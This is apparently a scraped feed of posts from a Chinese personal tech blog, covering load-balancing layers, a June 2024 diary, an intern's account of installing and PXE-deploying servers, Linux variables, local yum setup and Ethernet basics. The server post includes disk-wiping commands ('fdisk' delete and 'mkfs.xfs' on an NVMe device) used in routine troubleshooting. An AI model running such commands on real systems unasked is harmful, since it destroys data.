二层负载均衡（mac）\n根据OSI模型分的二层负载，一般是用虚拟mac地址方式，外部对虚拟MAC地址请求，负载均衡接收后分配后端实际的MAC地址响应.\n三层负载均衡（ip）\n一般采用虚拟IP地址方式，外部对虚拟的ip地址请求，负载均衡接收后分配后端实际的IP地址响应. (即一个ip对一个ip的转发, 端口全放开)\n四层负载均衡（tcp）\n在三次负载均衡的基础上，即从第四层\u0026quot;传输层\u0026quot;开始, 使用\u0026quot;ip+port\u0026quot;接收请求，再转发到对应的机器。\n七层负载均衡（http）\n从第七层\u0026quot;应用层\u0026quot;开始, 根据虚拟的url或IP，主机名接收请求，再转向相应的处理服务器。\n二层：链路聚合\n四层：基于IP+端口的负载均衡\n在三层负载均衡的基础上，通过发布三层的IP地址（Virtual IP），然后加四层的端口号，来决定哪些流量需要做负载均衡，对需要处理的流量进行NAT处理，转发至后台服务器，并记录下这个TCP或者UDP的流量是由哪台服务器处理的，后续这个连接的所有流量都同样转发到同一台服务器处理。 L4 switch，主要分析IP层及TCP/UDP层\n七层：基于虚拟的URL或主机IP的负载均衡\n在四层负载均衡的基础上（没有四层是绝对不可能有七层的），再考虑应用层的特征。比如：不同业务交给不同服务器，假设用户访问高流量网站，在会话期间，它可能会请求静态内容（例如图像或视频）、动态内容（例如新闻订阅源）或者交易信息（例如订单状态）等等。7层负载平衡允许负载均衡器根据请求本身中的消息（如内容类型）来路由请求。可以将对图像或视频的请求路由到存储它的服务器；可以将诸如折扣价之类的交易信息请求路由到负责管理定价的应用服务器…\n","date":"2024-06-25T08:33:08+08:00","permalink":"https://proben1.github.io/2024/lb/ha%E7%9B%B8%E5%85%B3%E6%A2%B3%E7%90%86/","title":"LB/HA相关梳理"},{"content":"2024.6\n总结：诸事不顺，但是平推了所有不顺。\n需要提升： 英语正式演讲能力 加强心理承受能力，同时少点生气 讲话语速放缓，语气平和一些\n周五单位发通知，周二下班前要社保卡。我看了下，周六银行不开门，周天开门，遂去办理。 周天去了中国银行，发现开门了但是没发办理社保业务，没多想网申了社保卡，以为提供了信息就有了电子社保卡，实际上不行，需要等实体卡邮寄到了才能激活，而且申卡流程没法取消了。 出门，旁边有个建行，可以直接办理，但由于网申了，没法线下办理了。于是我今天费了最大的功夫，把本来能办好的事情办不好了。十分难受，现在复盘一下。\n首先是办事出了问题，处理流程，不要一味被情绪影响： 1.不要纠结已经发生的错误 2.思考该怎么弥补 3.事后总结，为什么会犯这种错误\n办事准备： 去办事也要像准备工作文档一样，用全力去准备。 你觉得你的方案万无一失，实际上并不是。你需要在详尽准备计划A的同时，思考哪个环节可能出现问题，并根据可能出现的问题做好计划B、C\u0026hellip;\u0026hellip;比如今天，如果我提前准备了几个大银行的去处，而不是死磕中国银行，就不会出现这种情况。如果我提前查了社保局，就会发现社保局周六上班，我就可以不用死磕周天。实在不行，可以周一周二请假去办理，都不会出现现在这种卡死在流程上的情况。\n以后去办事，一定要想多些方案，不要只准备一个，死磕到底。\n6.29-6.30\nJane来南京，和他漫雨逛了玄武湖、新街口，最后回小镇上小酌+上网。第二天早上起来到南站送别，顺手激活下社保卡。\n6.24-6.28\n进入了半工半学的状态，换了座位，每天也有被分配任务，工作效率逐渐重要了起来，不然每天14小时work+study也会把task拖到明天。\n写了个超长的部署脚本，只需要复制到xshell里，就可以解放双手，体会到屏幕狂刷代码的多巴胺分泌，最后再按下巨大的Enter键，完成荡气回肠的logout。\n6.17-6.23\n疯狂补齐落下的学习进度，在委托同学帮忙论文验收和归档，培训的课程、考试和presentation之间大脑多线程运作。每天七点起来，晚上赶着末班车back，周末准备周一的实操考试，办个社保卡还没办好。已经不能用充实来形容了，我感觉这几天人发生了某种蜕化，失去了几乎所有的内耗，和人交流不再迟疑。每天都干了很多事情，但是只能记住重要的事情，比如考试节点等等，回过神来发现社交软件有一堆对话，论文归档远程整完了，甚至自己还办了张流量卡hhh。\n6.12—6.16\n充实的五天。踏着夜色回到宿舍，第二天火线验收毕设，答辩，怼老师怼的太狠差点二辩hhh，不过还是顺利毕业啦。 毕业照，院里的，班里的，宿舍之间的…… 和舍友聚餐，铜锅涮肉，牛肚豆皮，漠北人烤肉…… 和网协的各位告了别，最后学妹送了我一份蛋糕，甚是感激。 收拾宿舍，邮了44斤的书回家，注销校园网，一点一点脱离西安这个城市……\n大一充满了张狂的热情，努力去成长，克服了很多自己的高中缺陷。大二并没有如理想般走出自己的道路，一次次失败的经历让我迷茫，学校课程和理想的冲突让我心烦意乱。大三准备考研，可惜一考一个不吱声，至今不忘考完数学之后，是以怎样的心情去考专业课的呢？大四一边克制自己的抑郁情绪，一边尽力抓住身边的稻草。在经历了种种之后，四年间的一切变成了一声感慨。 还好有斯卡蒂和她的小虎鲸们，感激很多人一直陪我到最后，在本科的时光，弥补了，很多本应有的遗憾。\n直到最后，在一个下小雨的清晨，舍友送我上了前往地铁站的出租车，我离开了这里，生活了接近四年的城市，一个小小的监牢，一个可以白天看山晚上想海的宿舍，一群有趣有志之人的相遇之地……\n6.9—6.10\n回连，准备会西安，处理一些杂事。 和节操樱花小聚。 通关了深海迷航二。\n6.7—6.8\n去姥姥家。端午煮了很多粽子鸡蛋，羊圈里新生了一只小羊。\n成功挑战了姥姥家的旱厕！\n6.5—6.6\n答辩时间出了，做一下接下来的计划。\n修改答辩PPT。\n上班之后生物钟变了，以往0:30我还精神的很，现在却头昏脑胀，提醒我需要睡觉。以往起床太阳公公会晒屁股，现在只能晒到脸hhhh。\n体检。填写入职相关材料。\n6.4\n火化。\n爷爷姜作欣，初中语文老师，一生教书育人。他写了一辈子文章，关心国家，关心学生，关心家人，是个善良的人。于2024年6月2日上午去世，享年93岁。印象中，爷爷和我下象棋，把写过的文章分享给我，和我探讨最近的新闻。他是个基督教徒，也会给我讲圣经，愿亲爱的爷爷回归主怀。\n6.3\n看望奶奶。\n被学校答辩抽检抽到，要求明天早上回学校。一下午时间联系导员，导师，教办。其中在教办的工作时间内，呼电不下20次，最后才接通。成功请假。经此一事，对学校的行政效率产生怀疑。其他感受不多说了。\n6.2\n爷爷走了，请假回大连。\n6.1\n1.下午去莫愁湖逛了一圈，风景很好，略惋惜此景无人共赏。\n2.许嵩在南京奥体演唱会，最后一首歌是《我乐意》，正如当年徒步跨海大桥时一样。\n3.给爸爸打个视频，爷爷当时一整天没说话，见到之后喊了声我的名字。爸爸差点哭了。\n","date":"2024-06-23T19:10:03+08:00","permalink":"https://proben1.github.io/2024/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%972024.6/","title":"茄科生物观测日志2024.6"},{"content":"仅作为个人成长的记录。内容为三次装机实践的过程和一些总结。\n零 实习不到一周，第一个任务来了，让我们去机房装个系统练手。初到机房，一切都很新鲜：嗡嗡的风扇声、错综复杂的排线、柜子上摆着一列列的大方块。Leader指了指一个柜子，五个服务器静静躺在上面，“硬件可能有问题，你们自己检查，哪里坏了可以换，把服务器装好，下周我来检查。“于是几个一脸懵的小可爱开始苦哈哈的蹲机房捣鼓。\n硬件报错风波 服务器是DELL的，刚好五个电源，我们一人插一个，还在找开机按钮呢，就看到上面的小显示屏滚动起了字符：\nhwc2002 system board Riser cable or interconnect failure . Check connection. (Hwc2002系统板riser线缆或互连故障。检查连接。) unavailable in standby. (待机不可用。) PSU003 Power input for PSU 1 is lost .Check PSU cables. (PSU003电源模块1输入丢失检查电源线缆。) 当时心中就是一咯噔，上网搜了下23是因为只插了一个电源的原因，一般服务器都有两个电源，1我不知道，于是下电开盖查看，。由于不知道什么是hwc2002，我最后只能观摩观摩服务器里头啥构造，并且。。。。。。卸了一个内存条，然后（特别）费力地把它再按回去，并拍了一张照片留念：\n（太巧了刚好是个错误示范）上面插的黑色塑料片是占位置用的，绿色是内存，现在来看我重插的内存很明显连在了一块，是有问题的。Dell服务器内存安装按照颜色的顺序进行插： 白色、黑色、绿色。最后经过了开机自检的重大报错之后，我联想到了我对内存所做的不可告人的操作，并再次（特别）费力的把它重新插会白色凹槽。\n安装系统 经过了彻彻底底的人为制造错误之后，我决定跳过这些直接进到安装操作系统。但是事情真的有这么简单吗？最开始我的思路是这样的：需要一个USB做启动盘，狂按F几键进入从USB启动，安装，搞定！但是系统在启动原先系统失败后进入了boot菜单，我迷路了。。。。。\n于是，它显示的每个按钮我都按了按，在BIOS丛林探索了一小时（一半时间都是在等自检），我终于走到了终点，那个让我欣喜若狂的界面——系统安装。我快速的配置好了支持语言、时区、安装模式，等到分配磁盘的时候、、、显示没有空间！！！我蒙了，于是开始反思换个硬盘的必要。这时善良的同事提醒了我：需要做RAID。\n磁盘阵列（Redundant Arrays of Independent Disks，RAID），由很多块独立的磁盘，组合成一个容量巨大的磁盘组，通过把数据放在多个硬盘上，既能条带化地提升性能，又可以作为冗余。不同服务器进入配置菜单的方式不一样，这里需要在自检后通过Ctrl+R的方式进入RAID配置。我删除了原来的逻辑分组，新建了一个逻辑组，在这个过程中它会进行快速初始化，再进入操作系统安装界面之后，就有磁盘空间了。\n网络 完成了安装之后，就进入了操作系统（这里有个伏笔，我没有思考它是怎么进到操作系统的）。以为万事大吉？No no no，还有后续很多软件的安装还有一些优化的配置，难道我们要一直在这里蹲着手敲？这时候就需要连上自己的电脑。这里也有很多小问题，包括：插上网线了不知道下一步干啥、找不到自己电脑在哪里改以太网IP、服务器不知道插的是哪个网卡、配完忘重启网络以为又坏了。。。总之，最后成功ping到了自己电脑，可以ssh登录，值得小小庆祝一下。\nyum 已经跨过两座大山：装系统和配网络，接下来要安装环境了。首先要建立一个本地的yum源，但是我改怎么把镜像文件传过去呢？我先想到用usb直接挂载，复制过去。但是出现了windows和linux文件系统不兼容的问题，也就是封面搜索的那个问题。最后通过xftp网络了过去，速度还蛮快的。\n按照集成手册配置本地yum源，中途遇到了版本不同报错的问题，手动修改即可，最终yum list的成功显示一串串的软件包，当时成就感拉满。\n疯狂安装软件:yum install -y xxx 检测哪些没按上的:rpm -q xxx | grep not 之后就是配置/etc/profile，配置/etc/sysctl.conf，一步一步完成操作，因为不是生产环境所以有些步骤跳过了。\n检查 Leader发来了一个检测脚本，给777权限跑一下，最后结果如下：\n可以看到上面大部分是服务和软件的问题，但是下面的检测结果就有点那啥了，单纯是看有没有这个文件，如果确实是实际环境，可以起到一个提醒的作用。但是但是练习环境下根本配不到这些啊喂~\n不管怎么说，总算费劲的给搞完了吼吼，我物理装机的第一部作品！\n壹 有个小任务，要装几台系统作为网络设备的测试平台，交给我们去安装系统，这次是浪潮的服务器。\n初见管理口 服务器通常会有两种不同类型的网络接口，即管理口（Management Port）和网口（Ethernet Port），它们的作用和用途不同。\n管理口通常是用于服务器管理的网络接口，也被称为外带网卡或带外接口（Out-of-band Interface）。管理口与服务器主板上的 BMC（Baseboard Management Controller）或者其他管理卡相连，可以通过远程管理协议（例如IPMI、iDRAC、iLO等）进行远程管理和监控服务器。网口就是咱们平时正常用的网络接口。\n学长指导，可以通过内网直接访问到这几台服务器的带外口，我直接ssh连了上去。。。发现是一个看不懂的命令行，smartctl，没有办法像bash一样操作。试了几下，用浏览器访问这个ip，发现了新大陆——BMC页面，可以图形化的管理服务器硬件的状态，以及一个重要的功能：远程控制台。进到了远程控制台，相当于一个小显示屏，远程实时显示服务器的屏幕。\n安装系统 好奇宝宝们尝试用远程上传镜像媒体的方式安一下系统，结果这个速度一言难尽，20分种跑了几kb，遂放弃。（我们后来才知道，这个在进入系统安装界面的时候才会开始正常的上传）。\n所以最后还是选择了进到机房物理USB的方式安装。\n配置RAID 安装过程中理所当然的遇到了硬盘没空间的问题，需要初始化一下硬盘。这里就出现问题了。我在安好了操作系统之后，发现无论如何都无法进入系统，在一个地方反复徘徊检测。询问学长，可能是硬盘启动顺序设置不对的原因。于是我们进到BIOS启动顺序菜单进行查看。\n十分不幸，BIOS启动顺序菜单只能把所有硬盘当成一个整体进行启动，那么不同硬盘之间呢？和同事对比了之后，进入了raid管理界面，简单分析一下：\n原本服务器里有两个480GRAID1的系统盘，组成了一个逻辑盘组，排在启动顺序第一位；12个1.2T的数据盘，组成了令一个逻辑盘组，排在启动顺序第二位。因为我初始化系统盘的时候，不是直接原地初始化，而是删除了逻辑盘组再新建。删除了之后第二个逻辑盘组顺位到第一启动位，所以新建的逻辑盘组只能排在第二。在调整好硬盘的启动顺序之后，可以正常进入系统。\n配置网卡 需求是将两个万兆网卡做双网卡绑定，哪个是万兆网卡可以在装系统时的network里查看。\n但是注意！！！不要在图形化界面里配置网络，老老实实进到系统vi /etc/sysconfig/network-scripts/里配置，不然可能出现不可预料的后果（同事的血泪教训）。以及后面的restart不要把network和NetworkManager混用。\n完成了双网卡绑定的配置之后，这里暂时告一段落。\n佰 新任务，工作实战课题，去ZTE的滨江园区进行预装。滨江园区，比较大，规矩也比较多，是不一样的环境。两批服务器，分别是利比亚和利比里亚的，需要从裸机到安装操作系统。共计45+38台\n首先说下为什么要去园区吧，因为园区有着一个完整的供应链。ZTE的对外业务包括语音核心网，我们的计费处理是其中的一环。 预安装需要为境外项目服务，第一是可以节省项目的时间。一些服务器和环境被预先配置好，这样到现场可以立即开始使用。第二是可以检查硬件的可使用性，相当于提前对设备能否正常运行做的一次测验。这样现场再出现问题，可以定位到问题在哪里出现，比如运输途中损坏，更有利于后续的鉴定。\n此外预安装还可以减少一部分项目现场的成本。不过总的来说还是为了境外项目可以更快更好的完成。\n机架长这样（照片是ZTE的人拍的）\n触摸服务器 拆开防尘盖查看服务器，进行辨识。\n服务器前面板：品牌标识、状态指示灯、存储硬盘（很大一排）\n内部：主板、CPU两个（可numa），内存条（需要按正确顺序颜色安装）、风扇、防尘盖\n后面板：千兆网卡（4口），万兆网卡（2口），480G系统硬盘，电源\n前期准备 我认为前期是做准备工作，指的是不在现场就可以完成的任务，保证现场工作可以高效率无阻碍的执行。主要进行项目分析、资源准备、设备清点单和安装规划等工作。\n1. 所内准备 提交外出申请，确保自己出勤。 与同事进行工作交接，确保没有其他紧急任务或依赖项未解决。 2. 所外准备 提前联系机房管理员，确保能够顺利进入机房。 提前联系设备交接人，了解设备存放位置、运达情况、机房环境等信息。 3. 文件准备 深入掌握项目的背景、目标、设备配置要求。 准备详细的设备清点单，包括设备型号、数量、配件等。 准备项目规划表，规划不同服务器不同的功能，规划好IP。 根据项目需求制定项目SIMS部署表 根据项目需求制定时间规划表，确保工作进度，及时反馈。 准备必要的安装工具、测试工具（自己电脑上的镜像、ssh软件、cPing等等）。 当然，这些只是我最后的总结，实际上都不是我做的hhhhhh，我负责打杂+体力劳动+学习记录~\n中期执行 中期就是接触到服务器了，从清点设备收集信息到安装系统和软件，中期应该是耗时最长的。\n1. 设备清点与分类 依照：设备清点单、设备型号 交换机和防火墙：清点主设备，电源，风扇，光模块，尤其注意光模块单模多模和速率\n服务器：清点主机型号，CPU，网卡，内存，硬盘。包括硬盘类型，大小，型号，数量。网卡主要看接口。内存和CPU可在加电后进行查看。\n主要通过主机型号、网卡接口、硬盘类型，大小，型号，数量，区分主机应用。其中，需要物理将PR主机和DR主机进行布局上的调整，并将区分好的主机前后贴上作用标签。\n服务器清点时发现两台服务器型号统计反了，但是一台已经装好了系统并配好了IP，需要修改IP和主机名。我直接vi修改了相应网卡的配置文件并配合systemctl restart NetworkManager重启网络服务，检查过程中发现之前和现在的ip同时存在。reboot一下就好了，我才发现network与NetworkManager是差别的。\n2. 配置管理口 收集每台主机的SN号和之后要用到的数据口的MAC地址，记录到预安装的规划表中。 使用原始密码和原始IP登录每台主机，修改主机名、管理口IP等配置。 3. BIOS配置 多线程模式 Max\u0026ndash;Performance模式 系统盘RAID1配置 启动顺序配置，先硬盘再PXE 保存并退出 因为服务器对外管理口默认网段和我们计划的网段不一致，修改后需要重新配置电脑IP，这里有个小妙招：在网络共享中心配置IP时，点“高级”，添加新网段的IP，这样可以同时访问多个网段（原理和昨天的配置路由不同），比较方便。化身多线程大师！\n4.SIMS部署 选取并安装种子机 部署SIMS 计划好每批部署多少台，填写SIMS部署表，上传 确认客户端服务器网线连接无误、数据无误后，启动SIMS批量部署 SIMS一键部署工具为IAAS平台自动化部署工具，用户通过向SIMS一键部署工具中导入平台规划数据，SIMS一键部署工具将全自动的部署操作系统及平台软件。在平台设施构建阶段，为用户节省大量时间并提供标准化的软件输出。\n至于怎么部署SIMS，这确实是我没有接触过的事情，涉及到docker相关，但是我在重装种子机的时候，看到了作为SIMS部署系统里相关的压缩包，推测是相关压缩包+命令的手册进行种子机的部署。与其知道怎么部署SIMS，不如了解一下SIMS的原理。\n原理：部署信息表+对外管理口+PXE\n部署信息表就是列出了相关配置，什么系统装什么，mac是什么，对外口的账号密码是什么，然后通过命令模式，在外操控对外口、进PXE，在内安装操作系统和配置，都是预先的命令。\nPXE PXE(Pre-boot Execution Environment)，可以使计算机通过网络启动，也是厂商默认和推荐的方式。分为 client和server两端，服务端就是种子机，客户端就是等待安装的机器。\n开机后，客户端计算机的网卡BIOS将广播DHCP请求，以获取一个IP地址。 DHCP服务器响应客户端的DHCP请求，并提供了IP地址、子网掩码、默认网关、TFTP（Trivial File Transfer Protocol）服务器地址和启动文件名等信息。 客户端使用TFTP协议从TFTP服务器加载启动文件。负责为客户端计算机准备启动环境，包括连接到远程安装服务器等。 启动加载程序执行后，客户端将从安装服务器下载并加载完整的操作系统安装映像文件。 安装程序执行，引导用户完成操作系统的安装过程。 种子机充当DHCP服务器，引导客户端的PXE流程：\n至于这个装系统，要是流畅的话会爽到什么程度，我只能说如下：\n一个个都是命令形式，完全没有图形化界面，分磁盘的规划都是复制粘贴上去的。but，代价是什么？？\n代价是。。。调试。主要是不断的操作，不断的出错，不断的排查并继续操作。最开始设置的只有硬盘boot，但是一直卡在no boot device，推测一直卡在硬盘这里，没有激活PXE（理论上是可以自动激活一次的）。只能手动去调这个了，也就是说利比亚的机器需要再统一改一次BIOS才能SIMS集体安装。调试好了之后，可以用SIMS自动部署。\n还出现了已经进入PEX模式，准备进行操作系统安装，但是卡住不动，需要手动选择版本与内核，同时接下来需要手动在文字界面安装操作系统的情况，\n解决思路：\n1、对比sims安装表里是否有ip、mac、主机名等等的错误，经过对比后没有发现错误\n2、通过docker exec -ti $(docker ps | grep pxe | awk '{print $1}') bash命令进入种子机里pxe的docker，跑到/var/lib/tftpboot/pxelinux.cfg中查看是否有对应mac地址的文件，发现确实有（图左），但是无法查看。而通过cat 58-53-c0-94-17-46\\命令反而可以查看，于是发现文件名后面是一个空格，真相大白。\n3、将这批机器换到下一批重新安装，修改表中的所有mac地址，删去后面的空格，同时仔细检查。\n原理：\n在空格前加上反斜杠（\\），告诉shell这个空格是文件名的一部分，而不是命令参数的分隔符。\n当我直接从服务器对外管理界面复制mac的时候，邪恶的电脑会给我或前或后的加上空格符号，在前面的还可以看出来，删去了。在后面的看不出来，导致结果非常的哇塞。\n5.重装种子机 这个种子机手动重装居然耽误了我一天的时间。。。当时我可是信心满满，实际上坑不少。先从什么是NVME说起吧。\nNVME是一种硬盘协议，专为SSD设计，利用高速接口进行CPU和SSD间的数据通信。除了快就是贵，用作加速盘，数据库服务器上都安排了两块。不巧的是，种子机选取的就是数据库的服务器，这个大伏笔。\n操作系统安好了之后，登不上去，一度让我怀疑是安装的时候连续两次输了相同的错误密码。最后发现一直登录的是原SIMS的系统，原来的硬盘没有格式化，而且放在了第一启动位置，出现了启动顺序冲突。这个问题之前遇到过了，所以很快就定位并修改了启动顺序。\n不同的服务器调整的方法不一样，之前浪潮的服务器只能支持所有硬盘作为一个整体来启动，我们只能提前规划好创建逻辑磁盘的顺序来达到目的，而这里中兴的R5300G4可以细分到哪个硬盘，我认为这个更加合理。\n然后就来了个大的。\n调整了boot的硬盘启动顺序后，出现报错\nbash: cannot create temp file for here-document: Read-only file system\n还真没遇到过，排错吧~先使用mount命令查看结果，根目录显示ro（readonly），显然有问题。使用lsblk命令查看硬盘挂载情况，可以很明显的看到vg00大部分都没有挂载。\nimg\r怀疑开机自动挂载没有打开，cat /etc/fstab查看情况，但是这里确实有记录自动挂载，那就是其他原因导致挂载不上去。\n然后看到nvme0n1里面还有SIMS部署用到的临时操作系统，使用如下命令删去并格式化。\nfdisk /dev/nvme0n1 d mkfs.xfs /dev/nvme0n1 再次返回BMC页面，对系统RAID1进行快速格式化，重装系统，最后成功解决。接着就是yum源，配置，之前的那一套，拿下种子机的预装。\n原因有两点：第一，原SIMS的系统没有清除干净；第二，之前我对系统RAID1进行了慢速格式化，而当时我不知道这个格式化到底是什么速度，没等格式化完事等不及了安装系统。\n慢速初始化和快速初始化\n快速格式化使系统认为磁盘上没有文件了。它并不真正格式化全部硬盘，而是快速地将文件系统标记为“无文件”状态。因此，快速格式化后，数据有可能通过特定的工具恢复。\n慢速格式化或完全格式化会扫描硬盘上的所有磁道，清除硬盘上的所有内容。这个过程还包括检查磁盘上的坏道，并对其进行标记。完全格式化后的数据无法恢复，因为它真正地擦除了磁盘上的所有数据。\n最最最后，利比里亚的服务器延迟一周发货，我们预先帮助之后的业务部门插下光纤。。。\n交换机与光纤安装\n光模块（optical module）是现在通信中最重要的器件之一，实现光电转换，现在的光模块也集成了一些数字信号处理的功能。\n光纤有两个插孔，先接好一台机器，当要与另一台机器接的时候，查看此时光纤的两个插孔中哪一个一个冒光，你需要把光纤冒光的头插到机器不激光的口，把光纤不冒光的头插到机器冒光的口，完成上行和下行线路的建立。\n总结 关于预装，其实是分体力活和脑力活的。\n体力活包括但不限于：搬服务器，收集信息，插拔网线与光纤，服务器上电下电，甚至包括改BIOS。这部分涉及到反复操作，并且需要耐心（尤其是等服务器开机）。\n脑力活，可以是SIMS的调试，设备的调试，整体的预转的规划。尤其是在椅子上坐着看SIMS部署的时候，一片一片命令在日志翻过，可以明显感受到自动化脚本降维式的打击。\n多去干脑力活，对个人成长是有帮助的。每一次成长，都来源于直面和解决问题，而不是否定和逃避。半个月的时间，我从一个对物理服务器一无所知的小白，到最后自己可以独立安装操作系统和相关环境，成就感是有的。刚开始时，对物理服务器感到陌生和畏惧，但随着学习的深入和实践的积累，逐渐建立了信心。这是一个不断尝试和犯错的过程，不断从错误中吸取教训，慢慢经验就积累起来。\n顺带一提，一U是4.445cm。\nEOL\n","date":"2024-05-28T19:31:18+08:00","image":"https://proben1.github.io/2024/%E8%A3%85%E7%B3%BB%E7%BB%9F%E4%B9%8B%E4%BB%8E0%E5%88%B0100/%E6%95%B4%E4%BD%93%E7%8E%AF%E5%A2%83_hu6d95ae0bcf28ccaf22018a9e11d0c3f9_5043893_120x120_fill_q75_box_smart1.jpg","permalink":"https://proben1.github.io/2024/%E8%A3%85%E7%B3%BB%E7%BB%9F%E4%B9%8B%E4%BB%8E0%E5%88%B0100/","title":"装系统之从0到100"},{"content":"简写发音 K、M、G、T、P： Kilobytes、Megabytes、Gigabytes、Terabytes、Petabytes\ne.g. for example\netc.\tet cetera\n符号发音 /\tSlash\n- hyphen\n_ underscore\n\\ backslash\nOpen\u0026quot;(\u0026quot; and close \u0026ldquo;)\u0026rdquo; parenthesis\n\u0026ldquo;[\u0026rdquo; and \u0026ldquo;]\u0026rdquo; are square brackets.\n#\thash\n+ Plus\n- Minus/Subtract/Take away\n乘除\tTimes (multiply)、Divide\ne.g. Universal-Appliances.co.uk/customer_enquiries\n“Universal hyphen Appliances dot co dot UK (forward) slash customer underscore enquiries”.\n学习网站：https://www.londonschool.com/blog/signs-and-symbols/\n易错发音 推荐网站：https://cpwp.netlify.app/\n尤其是access的读法（那个向上挑一下的感觉）\nps：这个网站的kubernetes发音错了，应改是i的音，不是i：\n","date":"2024-05-21T17:07:43+08:00","permalink":"https://proben1.github.io/2024/%E8%8B%B1%E8%AF%AD%E5%8F%91%E9%9F%B3/","title":"英语发音"},{"content":"每一种编程语言中，我们都会碰到变量的作用域的问题。Linux 是一个多用户的操作系统。多用户意味着每个用户登录系统后，都有自己专用的运行环境。而这个环境是由一组变量所定义, 这组变量被称为环境变量。用户可以对自己的环境变量进行修改以达到对环境的要求。\n本地vs环境\n本地变量只对当前shell生效，用“变量名=变量值”设定 环境变量对子进程也生效，用export设定 用户vs系统\n系统级变量对所有用户生效 用户级变量只对当前用户生效 暂时vs永久\n如果要设定永久的变量，需要写入相应文件 否则就是暂时的，下次登录不生效 对所有用户生效的永久性变量 vi /etc/profile 这类变量对系统内的所有用户都生效，所有用户都可以使用这类变量。作用范围是整个系统，只在 root 下才能修改。\n修改后使用source命令进行生效\nsource /etc/profile 对单一用户生效的永久性变量 在用户目录下的.bash_profile 文件中添加变量，该文件是隐藏文件\n若bash是以login方式执行时，读取~/.bash_profile，若它不存在，则读取~/.bash_login，若前两者不存在，读取~/.profile。 当bash是以non-login形式执行时,读取~/.bashrc 临时有效的环境变量 此类环境变量只对当前的 shell 有效。当我们退出登录或者关闭终端再重新打开时，这个环境变量就会消失。\nexport 变量名=变量值 #设置新的环境变量 变量名=变量值 #设置或更新本地变量 echo $变量名 #打印 unset 变量名 #删除 readonly 变量名 #设置只读 env #显示当前用户的变量； set #显示当前 shell 变量(shell 变量包含用户变量) 生效顺序 bash会在用户登录时，读取下列四个环境配置文件：\n全局环境变量设置文件：/etc/profile、/etc/bashrc。 用户环境变量设置文件：~/.bash_profile、~/.bashrc。\n读取顺序：① /etc/profile、② ~/.bash_profile、③ ~/.bashrc、④ /etc/bashrc。\n① /etc/profile：此文件为系统的每个用户设置环境信息，系统中每个用户登录时都要执行这个脚本，如果系统管理员希望某个设置对所有用户都生效，可以写在这个脚本里，该文件也会从/etc/profile.d目录中的配置文件中搜集shell的设置。 ② ~/.bash_profile：每个用户都可使用该文件设置专用于自己的shell信息，当用户登录时，该文件仅执行一次。默认情况下，他设置一些环境变量，执行用户的.bashrc文件。 ③ ~/.bashrc：该文件包含专用于自己的shell信息，当登录时以及每次打开新shell时，该文件被读取。 ④ /etc/bashrc：为每一个运行bash shell的用户执行此文件，当bash shell被打开时，该文件被读取。 常见的环境变量 BASH Bash Shell的全路径 CDPATH 用于快速进入某个目录。 PATH 决定了shell将到哪些目录中寻找命令或程序 HOME 当前用户主目录 HISTSIZE 历史记录数 LOGNAME 当前用户的登录名 HOSTNAME 指主机的名称 SHELL 当前用户Shell类型 LANGUGE 语言相关的环境变量，多语言可以修改此环境变量 MAIL 当前用户的邮件存放目录 PS1 基本提示符，对于root用户是#，对于普通用户是$\nsu和sudo su - user #切换用户user且切换环境变量 su user #切换用户user，不切换环境变量 sudo user #使用user权限运行单个命令 su命令会启动一个新shell，环境变量和加不加“-”有关，执行时需要输入新用户的密码\nsudo是以新用户的权限运行某个命令，这个能运行的范围由root用户规定，输入的是现在用户的密码\n","date":"2024-05-21T15:50:07+08:00","permalink":"https://proben1.github.io/2024/linux%E5%8F%98%E9%87%8F/","title":"Linux变量"},{"content":"Linux本地yum源配置，以Oracle Linux 8.6为例\n创建系统镜像上传目录 mkdir /soft/os_iso 想个办法传上镜像文件\n备份默认资源库 cd /etc/yum.repos.d mkdir /etc/yum.repos.d/backup mv /etc/yum.repos.d/*.repo /etc/yum.repos.d/backup/ 配置yum源 在/etc/yum.repos.d/下创建一个local.repo文件\nvi /etc/yum.repos.d/local.repo\n[OL8_BaseOS] name=Oracle Linux 8 x86_64 BaseOS baseurl=file:///mnt/BaseOS/ gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY gpgcheck=0 enabled=1 [OL8_AppStream] name=Oracle Linux 8 x86_64 AppStream baseurl=file:///mnt/AppStream/ gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY gpgcheck=0 enabled=1 挂载iso镜像 cd /soft/os_iso mount -o loop OracleLinux-R8-U6-x86_64-dvd-8.6.iso /mnt 更新元数据缓存 # 清除缓存，如果是第一次配置可以不输入 yum clean all dnf repolist dnf makecache 检测和查看 #检查是否成功 dnf list #查看当前yum源 yum repolist all ","date":"2024-05-21T15:37:14+08:00","permalink":"https://proben1.github.io/2024/%E6%9C%AC%E5%9C%B0yum%E6%BA%90%E9%85%8D%E7%BD%AE/","title":"本地yum源配置"},{"content":"以太网连接介质 铜缆\n铜缆又称为双绞线，双绞线的外部是外套，两端使用RJ-45的标准制作接口。 直连线：两端线序相同；交叉线：两端线序不同 对于同种设备之间的连线，要使用交叉线，不同设备的连接，要使用直连线\n光纤\nLC-LC接口，用于SFP模块\n单播、广播、组播 单播 每次只有两个实体相互通信，发送端和接收端都是唯一确定的。\n广播 一个主机向网上的所有其他主机发送帧\n组播 组播帧仅传送给属于组的多个主机.\n交换机工作原理 泛洪 交换机没有在MAC地址表中找到和目标MAC地址匹配的记录，则交换机将数据帧发送到自己的全部端口，也就是\u0026quot;广播\u0026quot;给下游的所有设备；下游设备也会检查Header，如果发现目标MAC地址和自己的不符，则会默默丢弃。\n学习 交换机其中一个主要功能是维护一个 MAC 地址表，将每个交换机端口与所连接设备的 MAC 地址建立映射关系。交换机的MAC地址表一开始是空的，因此每次当交换机接收到数据帧时，都会查看Header，将数据帧中的源MAC地址和接收到数据帧的端口进行映射，并存储在自己的MAC地址表中。慢慢地，每个连接到交换机的设备都会发出一些数据，MAC地址表中的记录会逐渐增加，直到这个局域网下的所有设备的MAC地址和端口映射都存储到了自己的MAC地址表中。因此，交换机只会将数据帧的发送方的MAC地址存储在MAC地址表，对于所有在表中没有记录的MAC地址，会一律使用泛洪作为应对。\n转发 交换机在MAC地址表中找到和目标MAC地址匹配的记录，交换机将数据帧转发到对应的端口。\n过滤 基本上只有泛洪功能会依赖过滤。过滤主要是为了防止数据帧在泛洪时被发回给来源端口。\nVLAN LAN，局域网。全称为Local Area Network。 广播域：数据帧能到达的范围 突域：数据发送可能产生冲突的范围\nVLAN，(Virtual LAN) 虚拟局域网。 VLAN 通过在以太网帧中的地址和类型之间新增了一个字段，字段中定义了VLAN ID。 VLAN 